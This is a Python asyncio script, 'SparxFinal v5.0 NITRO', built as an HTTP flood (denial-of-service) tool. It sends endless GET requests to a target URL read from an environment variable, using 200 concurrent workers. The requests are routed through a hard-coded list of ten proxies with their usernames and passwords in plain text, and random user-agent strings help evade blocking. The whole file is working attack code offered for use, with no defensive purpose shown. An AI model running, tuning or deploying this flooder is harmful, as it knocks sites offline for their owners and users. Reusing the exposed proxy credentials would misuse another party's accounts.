import asyncio
import aiohttp
import os
import random
import sys

def log(msg):
    # Added flush to ensure real-time log updates on GitHub
    print(f"{msg}", flush=True)

class SparxFinal:
    def __init__(self):
        self.target = os.environ.get("TARGET_URL", "")
        self.stats = {"success": 0, "failed": 0}
        self.concurrency = 200 
        
        # Webshare Elite List
        self.proxies = [
            "http://nwllkxds:li0q0dyj1sdw@191.96.254.138:6185",
            "http://nwllkxds:li0q0dyj1sdw@142.111.67.146:5611",
            "http://nwllkxds:li0q0dyj1sdw@216.10.27.159:6837",
            "http://nwllkxds:li0q0dyj1sdw@64.137.96.74:6641",
            "http://nwllkxds:li0q0dyj1sdw@198.105.121.200:6462",
            "http://nwllkxds:li0q0dyj1sdw@107.172.163.27:6543",
            "http://nwllkxds:li0q0dyj1sdw@45.38.107.97:6014",
            "http://nwllkxds:li0q0dyj1sdw@198.23.239.134:6540",
            "http://nwllkxds:li0q0dyj1sdw@23.95.150.145:6114",
            "http://nwllkxds:li0q0dyj1sdw@31.59.20.176:6754"
        ]

        self.ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) Chrome/119.0.0.0 Mobile Safari/537.36"
        ]

    def show_banner(self):
        banner = """
        [v5.0 NITRO]
         ██████  ███▄    █  ▄▄▄       ██▀███   ▒██   ██▒
        ▒██    ▒  ██ ▀█   █ ▒████▄    ▓██ ▒ ██▒ ▒▒ █ █ ▒░
        ░ ▓██▄    ▓██  ▀█ ██▒▒██  ▀█▄  ▓██ ░▄█ ▒ ░░  █   ░ 
          ▒   ██▒ ▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▀▀█▄    ░ █ █ ▒  
        ▒██████▒▒ ▒██░   ▓██░ ▓█   ▓██▒░██▓ ▒██▒ ▒██▒ ▒██▒
        """
        log(banner)
        log(f"STATUS: NITRO BURSTING | TARGET: {self.target}")
        log("POWERED BY ASYNCIO\n" + "-"*50)

    async def worker(self, session, sem):
        while True:
            for p in self.proxies:
                for _ in range(900):
                    async with sem:
                        headers = {"User-Agent": random.choice(self.ua_list)}
                        try:
                            async with session.get(self.target, proxy=p, headers=headers, timeout=5) as r:
                                if r.status == 200:
                                    self.stats["success"] += 1
                                else:
                                    self.stats["failed"] += 1
                        except:
                            self.stats["failed"] += 1
                    
                    # FIXED LINE 58: Ensures no unterminated strings
                    if (self.stats["success"] + self.stats["failed"]) % 50 == 0:
                        log(f"🚀 [NITRO] HITS: {self.stats['success']} | FAIL: {self.stats['failed']}")

    async def start(self):
        if not self.target:
            log("❌ ERROR: TARGET_URL is empty!")
            return
        
        self.show_banner()
        sem = asyncio.Semaphore(self.concurrency)
        async with aiohttp.ClientSession() as session:
            tasks = [self.worker(session, sem) for _ in range(self.concurrency)]
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(SparxFinal().start())
    except Exception as e:
        log(f"⚠️ FATAL ERROR: {e}")
